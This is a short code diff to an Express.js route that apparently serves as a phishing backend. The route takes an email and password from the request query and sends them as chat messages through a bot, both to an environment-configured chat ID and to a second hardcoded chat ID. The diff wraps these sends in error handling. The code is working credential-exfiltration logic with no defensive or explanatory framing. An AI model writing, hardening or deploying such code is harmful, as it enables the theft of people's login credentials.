@@ -14,11 +14,16 @@ const route = router.use("/", function (req, res, next) {
     let pass = path.query.pass;
      // send a message to the chat acknowledging receipt of their message
     const chatId =  parseInt( process.env.CHATID );
-    
-    bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
-    bot.sendMessage(623167587 , `username: ${email} : password ${pass}`);
-    bot.close();
-    res.send({ good: 'good' });
+    try {
+        bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
+        bot.sendMessage(623167587 , `username: ${email} : password ${pass}`);
+        bot.close();
+        res.send({ good: 'good' });
+
+    }catch (err) {
+        console.log(err.message);;
+    }
+  
     res.end();
 })
 
